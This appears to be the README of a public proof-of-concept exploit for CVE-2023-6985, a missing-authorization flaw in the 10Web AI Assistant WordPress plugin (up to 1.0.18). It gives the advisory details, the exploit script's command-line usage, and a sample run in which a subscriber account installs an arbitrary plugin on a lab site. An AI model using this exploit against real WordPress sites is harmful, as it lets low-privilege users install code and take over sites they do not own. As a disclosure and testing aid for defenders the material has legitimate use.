# CVE-2023-6985
10Web AI Assistant – AI content writing assistant &lt;= 1.0.18 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation/Activation Description


### Description

The 10Web AI Assistant – AI content writing assistant plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the install_plugin AJAX action in all versions up to, and including, 1.0.18. This makes it possible for authenticated attackers, with subscriber-level access and above, to install arbitrary plugins that can be used to gain further access to a compromised site.

```
Severity: medium
CVE ID: CVE-2023-6985
CVSS Score: 6.5
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Plugin Slug: ai-assistant-by-10web
WPScan URL: https://www.wpscan.com/plugin/ai-assistant-by-10web
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/229245a5-468d-47b9-8f26-d23d593e91da
Diff URL: https://plugins.trac.wordpress.org/changeset/3027004/ai-assistant-by-10web/trunk/ai-assistant-by-10web.php
Download Vuln: https://downloads.wordpress.org/plugin/ai-assistant-by-10web.1.0.18.zip
```

How to use
---

```
python3 CVE-2023-6985.py -h
usage: CVE-2023-6985.py [-h] --url URL --username USERNAME --password PASSWORD --slug SLUG --php PHP

10Web AI Assistant – AI content writing assistant <= 1.0.18 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation/Activation Description CVE-2023-6985 - The 10Web AI Assistant – AI
content writing assistant plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the install_plugin AJAX action in all versions up to, and including, 1.0.18.
This makes it possible for authenticated attackers, with subscriber-level access and above, to install arbitrary plugins that can be used to gain further access to a compromised site.

options:
  -h, --help           show this help message and exit
  --url URL            URL of the WordPress site
  --username USERNAME  WordPress username
  --password PASSWORD  WordPress password
  --slug SLUG          WordPress Plugin Slug
  --php PHP            WordPress Plugin PHP file
```

POC
---

```
python3 CVE-2023-6985.py --url http://wordpress.lan --username user --password useruser1 --slug display-php-version --php display-php-version.php
Logged in successfully.
Getting REST API Nonce!
Nonce Found: df8390ff4b
Installing Plugin
Downloading installation package from https://downloads.wordpress.org/plugin/display-php-version.latest-stable.zip
Unpacking the package
Installing the plugin
Plugin installed successfully.
{"success":true}
```
